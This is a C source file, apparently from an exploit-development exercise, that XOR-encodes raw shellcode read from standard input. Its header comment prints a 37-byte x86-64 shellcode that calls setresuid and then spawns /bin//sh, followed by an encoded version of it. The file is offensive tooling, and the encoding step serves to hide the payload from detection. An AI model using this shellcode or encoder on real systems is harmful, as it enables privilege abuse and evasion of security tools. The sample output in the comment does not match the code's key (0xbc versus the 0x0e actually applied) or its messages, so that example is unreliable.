/*

Author: Abhinav Thakur
File: xor_encoder.c
Compile: $ gcc xor_encoder.c -o xor_encoder

Encode shellcode :$ ./xor_encoder < setresuid_shell.raw
User entered shellcode (37 bytes)
printBytes executing... !
0x31, 0xff, 0x31, 0xf6, 0x31, 0xd2, 0x31, 0xc0, 0xb0, 0x75, 0x0f, 0x05, 0x31, 0xc0, 0x50, 0xb0, 0x3b, 0x48, 0xbf, 0x2f, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x57, 0x48, 0x89, 0xe7, 0x31, 0xf6, 0x31, 0xd2, 0x0f, 0x05,
printBytes done...

Encrypted bytearray (KEY_BYTE used - 14 printBytes executing... !
0x3f, 0xf1, 0x3f, 0xf8, 0x3f, 0xdc, 0x3f, 0xce, 0xbe, 0x7b, 0x01, 0x0b, 0x3f, 0xce, 0x5e, 0xbe, 0x35, 0x46, 0xb1, 0x21, 0x21, 0x6c, 0x67, 0x60, 0x21, 0x7d, 0x66, 0x59, 0x46, 0x87, 0xe9, 0x3f, 0xf8, 0x3f, 0xdc, 0x01, 0x0b,
printBytes done...

*/

#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

#define KEY_BYTE 0xbc

void printBytes (const char arr[], unsigned int len)
{
        unsigned int i;

        fprintf (stderr, "\n[+] Printing raw bytes...\n");
        for (int i = 0; i < len; ++i)
                fprintf (stderr, "0x%02x, ", (arr[i] & 0xff));
        fprintf (stderr, "\n[+] done!\n");

}

int main (int argc, char *argv[])
{
        unsigned int read_bytes;
        unsigned char shellcode[0x1000];

        read_bytes = read (0, shellcode, 0x1000);

		fprintf (stderr, "Usage: %s < shellcode.raw\n", argv[0]);
        fprintf (stderr, "User entered shellcode (%d bytes)\n", read_bytes);
        printBytes(shellcode, read_bytes);
        fprintf (stderr, "\n");

        // XORing byte array
        for (unsigned int i = 0; i < read_bytes; ++i){
                shellcode[i] ^= KEY_BYTE;
        }

        fprintf (stderr, "Encrypted bytearray (KEY_BYTE used - 0x%02x)\n", KEY_BYTE);
        printBytes(shellcode, read_bytes);
        fprintf (stderr, "\n");
}
